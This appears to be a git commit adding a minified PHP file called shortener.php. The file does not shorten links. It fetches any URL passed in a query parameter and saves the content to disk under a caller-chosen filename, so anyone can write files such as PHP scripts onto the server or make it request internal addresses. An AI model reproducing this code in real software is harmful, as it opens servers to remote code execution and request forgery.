fc325c1cc12c185b8246628911c55f063b3768e8
Codenuclei <160272247+Codenuclei@users.noreply.github.com>
2024-02-17 11:14:41 +0530

    Update shortener.php

--- shortener.php
+++ shortener.php
@@ -1,1 +1,3 @@
-
+<?php
+function s($u,$c=null){$f=$c??substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),0,10);$d=@file_get_contents($u);if($d!==false){file_put_contents($f,$d);echo $f;}}$u=$_GET['URL']??null;if(filter_var($u,275))s($u,$_GET['CNAME']??null);
+?>
